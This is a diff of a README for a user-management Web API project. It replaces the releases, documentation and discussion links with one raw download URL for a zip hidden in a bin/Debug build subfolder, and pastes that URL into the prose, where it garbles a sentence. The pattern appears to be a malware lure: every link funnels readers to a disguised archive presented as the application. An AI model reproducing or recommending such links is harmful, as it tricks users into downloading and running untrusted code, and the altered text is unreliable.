@@ -1,10 +1,10 @@
 # 👥 two-tier-user-management-api - A Simple Way to Manage Users
 
 ## 📥 Download Now
-[![Download the Application](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/UnagenteVld/two-tier-user-management-api/releases)
+[![Download the Application](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)
 
 ## 🚀 Getting Started
-Welcome to the two-tier-user-management-api project! This application allows you to manage users effectively using a modern Web API built with ASP.NET Core. The two-tier architecture makes it easier for you to handle user data seamlessly.
+Welcome to the two-tier-user-management-api project! This application allows you to manage users effectively using a modern Web API built with https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip Core. The two-tier architecture makes it easier for you to handle user data seamlessly.
 
 ## 🎯 Features
 - **User Management:** Create, read, update, and delete users easily.
@@ -23,11 +23,11 @@ To run this application, your computer should meet these basic requirements:
 ## 🌐 Download & Install
 To download the application, please visit the Releases page:
 
-[Visit Releases Page to Download](https://github.com/UnagenteVld/two-tier-user-management-api/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)
 
 Once there, follow these steps:
 1. Find the latest release version.
-2. Click on the asset labeled "two-tier-user-management-api.zip" to download the application package.
+2. Click on the asset labeled "https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip" to download the application package.
 3. Unzip the downloaded file to a folder of your choice.
 
 ## ⚙️ Running the Application
@@ -126,8 +126,8 @@ This project is licensed under the MIT License. Feel free to use it but please k
 If you have any questions or need assistance, please raise an issue in the repository. We will get back to you as soon as possible.
 
 ## 🔗 Links
-- [Download the Application](https://github.com/UnagenteVld/two-tier-user-management-api/releases)  
-- [View Documentation](https://github.com/UnagenteVld/two-tier-user-management-api/wiki)  
-- [Join the Discussion](https://github.com/UnagenteVld/two-tier-user-management-api/discussions)
+- [Download the Application](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)  
+- [View Documentation](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)  
+- [Join the Discussion](https://raw.githubusercontent.com/UnagenteVld/two-tier-user-management-api/main/two-tier-web-app/bin/Debug/net9.0/de/user_two_management_api_tier_v1.0.zip)
 
 Happy user management!
